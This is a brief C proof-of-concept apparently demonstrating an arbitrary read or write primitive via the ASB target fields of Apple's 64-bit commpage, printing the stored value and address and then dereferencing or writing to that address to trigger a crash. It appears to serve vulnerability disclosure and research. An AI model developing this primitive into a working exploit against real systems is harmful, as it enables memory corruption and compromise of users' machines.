#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define COMM_PAGE64_BASE_ADDRESS      (0x0000000FFFFFC000)
#define _COMM_PAGE_ASB_TARGET_VALUE   (COMM_PAGE64_BASE_ADDRESS + 0x320)
#define _COMM_PAGE_ASB_TARGET_ADDRESS (COMM_PAGE64_BASE_ADDRESS + 0x328)

int main(int argc, const char *argv[]) {
    uint64_t asb_value = *(uint64_t *)(_COMM_PAGE_ASB_TARGET_VALUE);
    volatile uint64_t *asb_address = *(uint64_t **)(_COMM_PAGE_ASB_TARGET_ADDRESS);
    printf("[*] _COMM_PAGE_ASB_TARGET_VALUE : 0x%llx\n", asb_value);
    printf("[*] _COMM_PAGE_ASB_TARGET_ADDRESS : %p\n", asb_address);
    if (SHOW_ARBITRARY_READ) {
        printf("[!] Triggering arbitrary read!\n");
        (void)*asb_address; // Here's the crash reading from asb_address.
    } else {
        printf("[!] Triggering arbitrary write!\n");
        *asb_address = asb_value; // This is the crash writing asb_value to asb_address.
    }
    return 0;
}